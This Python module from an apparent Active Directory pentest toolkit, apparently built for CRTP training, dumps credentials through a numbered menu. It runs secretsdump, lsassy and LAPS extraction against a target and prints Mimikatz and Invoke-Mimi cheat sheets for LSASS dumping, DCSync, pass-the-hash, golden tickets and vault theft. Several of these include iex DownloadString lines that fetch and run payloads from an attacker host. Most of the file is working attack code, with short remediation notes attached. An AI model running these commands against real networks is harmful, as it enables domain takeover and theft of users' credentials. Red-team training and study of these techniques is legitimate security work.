"""
Module: Credential Dumping
Techniques: SAM, NTDS, LSASS (logonpasswords/ekeys), DCSync,
            LSA Secrets, DPAPI, LAPS, sekurlsa::ekeys,
            Invoke-Mimi cheat sheet, vault::cred
"""
from utils.helpers import *
from config.settings import SESSION, get_auth_string

def run():
    print_banner("CREDENTIAL DUMPING", "LSASS · SAM · NTDS · Mimikatz · Invoke-Mimi")
    dc   = input_or_session("dc_ip",    "Target IP")
    dom  = input_or_session("domain",   "Domain")
    user = input_or_session("username", "Username")
    pw   = input_or_session("password", "Password", secret=True)
    base = f"{dom}/{user}:'{pw}'@{dc}"

    print(f"""
  ── REMOTE (LINUX / IMPACKET) ────────────────────────────────────────────────
  [1]  SAM + SYSTEM           (remote registry)
  [2]  NTDS.dit DCSync        (all domain hashes)
  [3]  LSASS via lsassy       (no binary drop)
  [4]  LSA Secrets
  [5]  Full secretsdump
  [6]  LAPS Passwords via NXC

  ── MIMIKATZ (Windows side) ──────────────────────────────────────────────────
  [7]  sekurlsa::logonpasswords     (NTLM hashes + plaintext)
  [8]  sekurlsa::ekeys              (AES128/AES256 keys — CRTP)
  [9]  sekurlsa::pth                (Pass-the-Hash spawn)
  [10] lsadump::lsa /patch          (local SAM hashes)
  [11] lsadump::dcsync              (DCSync via Mimikatz)

  ── INVOKE-MIMI (PowerShell in-memory — CRTP) ────────────────────────────────
  [12] Invoke-Mimi cheat sheet      (all key commands)
  [13] Invoke-Mimi DCSync           (krbtgt + Administrator hash)
  [14] Invoke-Mimi Vault            (token::elevate + vault::cred /patch)

  [0]  Back
""")
    c = input(f"  {M}Choice{RST}: ").strip()

    # ── [1] SAM ───────────────────────────────────────────────────────────────
    if c == "1":
        run_cmd(f"{imp('secretsdump.py')} {base} -outputfile /tmp/sam_dump")
        success("SAM hashes → /tmp/sam_dump.sam")

    # ── [2] NTDS DCSync ───────────────────────────────────────────────────────
    elif c == "2":
        run_cmd(f"{imp('secretsdump.py')} {base} -just-dc-ntlm -outputfile /tmp/ntds_hashes")
        success("NTLM hashes → /tmp/ntds_hashes.ntds")
        add_finding(
            "NTDS.dit Dumped — All Domain Hashes",
            "Critical",
            f"Full domain hash dump via DCSync from {dc}",
            "Reset krbtgt twice; rotate all privileged account passwords immediately",
        )

    # ── [3] lsassy ────────────────────────────────────────────────────────────
    elif c == "3":
        run_cmd(f"nxc smb {dc} -u '{user}' -p '{pw}' -d {dom} -M lsassy")
        run_cmd(f"lsassy -d {dom} -u '{user}' -p '{pw}' {dc}")

    # ── [4] LSA Secrets ───────────────────────────────────────────────────────
    elif c == "4":
        run_cmd(f"{imp('secretsdump.py')} {base} -lsa -outputfile /tmp/lsa_secrets")

    # ── [5] Full secretsdump ──────────────────────────────────────────────────
    elif c == "5":
        run_cmd(f"{imp('secretsdump.py')} {base} -outputfile /tmp/full_dump")

    # ── [6] LAPS ──────────────────────────────────────────────────────────────
    elif c == "6":
        run_cmd(f"nxc ldap {dc} -u '{user}' -p '{pw}' -d {dom} -M laps")
        run_cmd(f"nxc smb  {dc} -u '{user}' -p '{pw}' -d {dom} -M laps")

    # ── [7] sekurlsa::logonpasswords ─────────────────────────────────────────
    elif c == "7":
        section("sekurlsa::logonpasswords — NTLM hashes + plaintext passwords")
        print(f"""
  {NEON_CYN}# Run Mimikatz on Windows target:{RST}
  .\\mimikatz.exe
  sekurlsa::logonpasswords

  {NEON_CYN}# Via Invoke-Mimi (PowerShell in-memory):{RST}
  iex ((New-Object Net.WebClient).DownloadString('http://{SESSION.get("attacker_ip","<attacker>")}/Invoke-Mimi.ps1'))
  Invoke-Mimi -Command '"sekurlsa::logonpasswords"'

  {NEON_CYN}# Via Loader.exe + SafetyKatz (no disk write):{RST}
  C:\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::logonpasswords" "exit"

  {NEON_CYN}# What it returns:{RST}
  {DIM}• NTLM hash (for Pass-the-Hash)
  • AES256/AES128 key (for Pass-the-Key / Overpass-the-Hash)
  • Plaintext password if WDigest enabled
  • Kerberos tickets in memory{RST}
""")

    # ── [8] sekurlsa::ekeys ──────────────────────────────────────────────────
    elif c == "8":
        section("sekurlsa::ekeys — AES encryption keys (CRTP key technique)")
        info("ekeys dumps AES128/AES256 keys — needed for Rubeus asktgt and Overpass-the-Hash")
        print(f"""
  {NEON_CYN}# Mimikatz on Windows:{RST}
  .\\mimikatz.exe
  sekurlsa::ekeys

  {NEON_CYN}# Via Invoke-Mimi:{RST}
  Invoke-Mimi -Command '"sekurlsa::ekeys"'

  {NEON_CYN}# Via Loader.exe + SafetyKatz (CRTP standard):{RST}
  C:\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::ekeys" "exit"

  {NEON_CYN}# What it returns (example):{RST}
  {DIM}* Username  : Administrator
  * Domain    : TECH
  * Password  : (null)
  * Key List  :
    aes256_hmac   1a2b3c... (64 hex chars)  ← use this with Rubeus
    aes128_hmac   a1b2c3... (32 hex chars)
    rc4_hmac_nt   acfd0028... (32 hex chars)  ← NTLM hash{RST}

  {NEON_CYN}# Use AES key with Rubeus (Overpass-the-Hash):{RST}
  Rubeus.exe asktgt /user:<user> /aes256:<aes256_key> /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt

  {NEON_CYN}# Use AES key with Rubeus (Pass-the-Ticket for specific service):{RST}
  Rubeus.exe s4u /user:<machine>$ /aes256:<aes256_key> /impersonateuser:Administrator /msdsspn:CIFS/<target> /ptt
""")
        add_finding(
            "AES Encryption Keys Extracted (sekurlsa::ekeys)",
            "Critical",
            "AES128/AES256 Kerberos keys dumped from LSASS — enables Overpass-the-Hash and Silver Ticket attacks",
            "Enable Credential Guard; restrict access to LSASS (RunAsPPL)",
        )

    # ── [9] sekurlsa::pth ────────────────────────────────────────────────────
    elif c == "9":
        section("sekurlsa::pth — Pass-the-Hash with Mimikatz")
        target_user = prompt("Username")
        target_dom  = prompt(f"Domain [{dom}]") or dom
        ntlm        = prompt("NTLM hash")
        if ntlm and target_user:
            print(f"""
  {NEON_CYN}# Spawn new PowerShell session with target user's hash:{RST}
  .\\mimikatz.exe
  sekurlsa::pth /user:{target_user} /domain:{target_dom} /ntlm:{ntlm} /run:powershell.exe

  {NEON_CYN}# Via Invoke-Mimi:{RST}
  Invoke-Mimi -Command '"sekurlsa::pth /user:{target_user} /domain:{target_dom} /ntlm:{ntlm} /run:powershell.exe"'

  {NEON_CYN}# From the spawned PowerShell — access remote machine:{RST}
  Enter-PSSession -ComputerName <target>
  Invoke-Command  -ComputerName <target> -ScriptBlock {{whoami}}
  net use \\\\<target>\\C$

  {NEON_YEL}Note:{RST} {DIM}The spawned process has a new logon session with the target hash injected.
  It will NOT work for local resources (uses Kerberos for domain auth).{RST}
""")

    # ── [10] lsadump::lsa /patch ─────────────────────────────────────────────
    elif c == "10":
        section("lsadump::lsa /patch — local SAM hashes via LSA patch")
        print(f"""
  {NEON_CYN}# Mimikatz (requires local admin):{RST}
  .\\mimikatz.exe
  lsadump::lsa /patch

  {NEON_CYN}# Via Invoke-Mimi:{RST}
  Invoke-Mimi -Command '"lsadump::lsa /patch"'

  {NEON_CYN}# Via Loader.exe + SafetyKatz:{RST}
  C:\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "lsadump::lsa /patch" "exit"

  {NEON_CYN}# What it returns:{RST}
  {DIM}RID  : 000001f4 (500) — Administrator
  User : Administrator
  LM   : (null)
  NTLM : acfd00282fbe9224...   ← use for PTH{RST}

  {NEON_CYN}# Also dump krbtgt from DC:{RST}
  lsadump::lsa /patch   {DIM}# run this ON the DC to get krbtgt hash{RST}
""")

    # ── [11] lsadump::dcsync ─────────────────────────────────────────────────
    elif c == "11":
        target_user = prompt("Target user (e.g. krbtgt, Administrator)")
        print(f"""
  {NEON_CYN}# DCSync via Mimikatz (run from any machine with replication rights):{RST}
  .\\mimikatz.exe
  lsadump::dcsync /user:{dom}\\{target_user or "krbtgt"}
  lsadump::dcsync /user:{dom}\\Administrator

  {NEON_CYN}# All users at once:{RST}
  lsadump::dcsync /all /csv

  {NEON_CYN}# Via Invoke-Mimi:{RST}
  Invoke-Mimi -Command '"lsadump::dcsync /user:{dom}\\{target_user or "krbtgt"}"'
  Invoke-Mimi -Command '"lsadump::dcsync /user:{dom}\\Administrator"'

  {NEON_CYN}# Via impacket (Linux):{RST}
  impacket-secretsdump {base} -just-dc-user {dom}\\{target_user or "krbtgt"}
""")

    # ── [12] Invoke-Mimi cheat sheet ─────────────────────────────────────────
    elif c == "12":
        section("Invoke-Mimi — PowerShell in-memory Mimikatz (CRTP standard)")
        attacker = SESSION.get("attacker_ip", "<attacker>")
        print(f"""
  {NEON_CYN}# Load Invoke-Mimi in memory (no disk write):{RST}
  iex ((New-Object Net.WebClient).DownloadString('http://{attacker}/Invoke-Mimi.ps1'))

  {NEON_CYN}# Or import from local file:{RST}
  Import-Module .\\Invoke-Mimi.ps1

  {NEON_YEL}═══ CREDENTIAL EXTRACTION ════════════════════════════════{RST}

  {NEON_CYN}# NTLM hashes + plaintext:{RST}
  Invoke-Mimi -Command '"sekurlsa::logonpasswords"'

  {NEON_CYN}# AES encryption keys (for Rubeus/PTT):{RST}
  Invoke-Mimi -Command '"sekurlsa::ekeys"'

  {NEON_CYN}# SAM local hashes:{RST}
  Invoke-Mimi -Command '"lsadump::lsa /patch"'

  {NEON_CYN}# DCSync — get krbtgt hash:{RST}
  Invoke-Mimi -Command '"lsadump::dcsync /user:{dom}\\krbtgt"'

  {NEON_CYN}# DCSync — get Administrator hash:{RST}
  Invoke-Mimi -Command '"lsadump::dcsync /user:{dom}\\Administrator"'

  {NEON_YEL}═══ PASS-THE-HASH ════════════════════════════════════════{RST}

  {NEON_CYN}# PTH — spawn PowerShell with target hash:{RST}
  Invoke-Mimi -Command '"sekurlsa::pth /user:Administrator /domain:{dom} /ntlm:<hash> /run:powershell.exe"'

  {NEON_YEL}═══ TICKET OPERATIONS ════════════════════════════════════{RST}

  {NEON_CYN}# List Kerberos tickets:{RST}
  Invoke-Mimi -Command '"sekurlsa::tickets"'

  {NEON_CYN}# Export all tickets to disk:{RST}
  Invoke-Mimi -Command '"sekurlsa::tickets /export"'

  {NEON_CYN}# Import (Pass-the-Ticket):{RST}
  Invoke-Mimi -Command '"kerberos::ptt <ticket.kirbi>"'

  {NEON_YEL}═══ GOLDEN/SILVER TICKET ════════════════════════════════={RST}

  {NEON_CYN}# Create Golden Ticket:{RST}
  Invoke-Mimi -Command '"kerberos::golden /User:Administrator /domain:{dom} /sid:<domain_SID> /rc4:<krbtgt_hash> /ptt"'

  {NEON_YEL}═══ VAULT ════════════════════════════════════════════════{RST}

  {NEON_CYN}# Credential Manager vault:{RST}
  Invoke-Mimi -Command '"token::elevate" "vault::list"'
  Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'
""")

    # ── [13] Invoke-Mimi DCSync ───────────────────────────────────────────────
    elif c == "13":
        section("Invoke-Mimi DCSync — krbtgt + Administrator (CRTP flow)")
        attacker = SESSION.get("attacker_ip", "<attacker>")
        print(f"""
  {NEON_CYN}# Step 1 — Load Invoke-Mimi in memory:{RST}
  iex ((New-Object Net.WebClient).DownloadString('http://{attacker}/Invoke-Mimi.ps1'))

  {NEON_CYN}# Step 2 — Extract krbtgt hash:{RST}
  Invoke-Mimi -Command '"lsadump::dcsync /user:{dom}\\krbtgt"'
  {DIM}→ Note the NTLM hash and aes256_hmac values{RST}

  {NEON_CYN}# Step 3 — Extract Administrator hash:{RST}
  Invoke-Mimi -Command '"lsadump::dcsync /user:{dom}\\Administrator"'

  {NEON_CYN}# Step 4 — PTH with Administrator hash (spawn elevated PS):{RST}
  Invoke-Mimi -Command '"sekurlsa::pth /user:Administrator /domain:{dom} /ntlm:<admin_hash> /run:powershell.exe"'

  {NEON_CYN}# Step 5 — Access DC from elevated PS:{RST}
  Enter-PSSession -ComputerName {dc}
  net localgroup administrators {dom}\\studentuser /add
""")
        add_finding(
            "DCSync via Invoke-Mimi",
            "Critical",
            f"krbtgt and Administrator hashes extracted via DCSync from {dom}",
            "Manage DS-Replication-Get-Changes ACE; alert on replication from non-DC machines",
        )

    # ── [14] Invoke-Mimi Vault ───────────────────────────────────────────────
    elif c == "14":
        section("Invoke-Mimi — Credential Manager vault (token::elevate + vault::cred)")
        info("Extracts credentials stored in Windows Credential Manager / Vault")
        print(f"""
  {NEON_CYN}# Load Invoke-Mimi:{RST}
  iex ((New-Object Net.WebClient).DownloadString('http://{SESSION.get("attacker_ip","<attacker>")}/Invoke-Mimi.ps1'))

  {NEON_CYN}# List vault contents first:{RST}
  Invoke-Mimi -Command '"token::elevate" "vault::list"'

  {NEON_CYN}# Dump and patch vault credentials (CRTP):{RST}
  Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'

  {NEON_CYN}# What token::elevate does:{RST}
  {DIM}Elevates to SYSTEM token — required to read credentials stored by services
  (e.g. scheduled tasks, services running as SYSTEM that saved credentials){RST}

  {NEON_CYN}# Common vault targets:{RST}
  {DIM}• Windows Credentials (stored via cmdkey or IE/Chrome)
  • Certificate-based credentials
  • Domain credentials cached by services
  • RDP saved credentials (use ts::mstsc instead for those){RST}

  {NEON_CYN}# Also check via cmdkey:{RST}
  cmdkey /list

  {NEON_CYN}# Read credential blobs directly (PowerShell):{RST}
  [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
  $vault = New-Object Windows.Security.Credentials.PasswordVault
  $vault.RetrieveAll() | % {{ $_.RetrievePassword(); $_ }}
""")
        add_finding(
            "Windows Credential Manager Vault Dumped",
            "High",
            "vault::cred /patch extracted credentials from Windows Credential Manager",
            "Audit stored credentials via cmdkey; use Credential Guard to protect secrets",
        )

    pause()
